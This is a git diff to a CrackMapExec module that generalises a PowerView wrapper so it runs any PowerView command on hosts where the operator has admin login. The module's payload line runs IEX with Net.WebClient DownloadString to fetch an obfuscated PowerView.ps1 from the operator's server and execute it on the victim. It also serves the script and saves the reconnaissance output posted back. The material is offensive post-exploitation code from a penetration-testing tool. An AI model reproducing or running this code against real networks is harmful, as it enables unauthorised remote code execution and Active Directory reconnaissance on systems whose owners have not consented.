@@ -1,51 +1,34 @@
 from cme.helpers import create_ps_command, obfs_ps_script, get_ps_script, write_log
 from StringIO import StringIO
 from datetime import datetime
+from sys import exit
 
 class CMEModule:
     '''
-        Wrapper for PowerView's Get-NetGroup function
+        Wrapper for PowerView's functions
         Module by @byt3bl33d3r
     '''
 
-    name = 'getcomputers'
+    name = 'powerview'
 
-    description = "Wrapper for PowerView's Get-NetGroup function"
+    description = "Wrapper for PowerView's functions"
 
     def options(self, context, module_options):
         '''
-            COMPUTERNAME  Return computers with a specific name, wildcards accepted (default: all computers)
-            SPN           Return computers with a specific service principal name, wildcards accepted (default: None)
-            DOMAIN        The domain to query for computers (default: current domain) 
+            COMMAND  Powerview command to run
         '''
 
-        self.computername = None
-        self.domain = None
-        self.spn = None
-        if 'COMPUTERNAME' in module_options:
-            self.computername = module_options['COMPUTERNAME']
+        self.command = None
+        if not 'COMMAND' in module_options:
+            context.log.error('COMMAND option is required!')
+            exit(1)
 
-        if 'DOMAIN' in module_options:
-            self.domain = module_options['DOMAIN']
-
-        if 'SPN' in module_options:
-            self.spn = module_options['SPN']
-
+        if 'COMMAND' in module_options:
+            self.command = module_options['COMMAND']
 
     def on_admin_login(self, context, connection):
 
-        powah_command = 'Get-NetComputer'
-
-        if self.computername:
-            powah_command += ' -ComputerName "{}"'.format(self.computername)
-
-        if self.domain:
-            powah_command += ' -Domain {}'.format(self.domain)
-
-        if self.spn:
-            powah_command += ' -SPN {}'.format(self.spn)
-
-        powah_command += ' | Out-String'
+        powah_command = self.command + ' | Out-String'
 
         payload = '''
         IEX (New-Object Net.WebClient).DownloadString('{server}://{addr}:{port}/PowerView.ps1');
@@ -73,7 +56,7 @@ class CMEModule:
             request.send_response(200)
             request.end_headers()
 
-            with open(get_ps_script('Recon/PowerView.ps1'), 'r') as ps_script:
+            with open(get_ps_script('PowerSploit/Recon/PowerView.ps1'), 'r') as ps_script:
                 ps_script = obfs_ps_script(ps_script.read())
                 request.wfile.write(ps_script)
 
@@ -98,6 +81,6 @@ class CMEModule:
 
             print_post_data(data)
 
-            log_name = 'Computers-{}-{}.log'.format(response.client_address[0], datetime.now().strftime("%Y-%m-%d_%H%M%S"))
+            log_name = 'PowerView-{}-{}.log'.format(response.client_address[0], datetime.now().strftime("%Y-%m-%d_%H%M%S"))
             write_log(data, log_name)
             context.log.info("Saved output to {}".format(log_name))
